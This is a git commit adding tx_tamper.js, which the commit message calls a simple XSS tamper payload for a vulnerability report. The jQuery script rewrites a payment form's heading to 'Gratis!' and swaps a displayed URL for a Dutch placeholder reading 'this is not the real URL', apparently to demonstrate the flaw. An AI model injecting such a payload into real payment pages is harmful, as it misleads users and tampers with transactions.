cd46b1e2aa0626a64357f9bc572032e443a196a7
Brian Heese <brian.heese@gmail.com>
2018-02-13 16:33:57 +0100

    simple xss tamper payload for vuln report

---
+++ tx_tamper.js
@@ -0,0 +1,5 @@
+jQuery('document').ready(function($){
+    $('#form_payment > div.col-xs-12.col-sm-4.col-md-4.col-lg-4 > h3').text('Gratis!');
+    $('#form_payment > div.col-xs-12.col-sm-4.col-md-4.col-lg-4 > p:nth-child(3) > strong:nth-child(1)').text('dit-is-niet-de-echte-url.nl');
+})
+
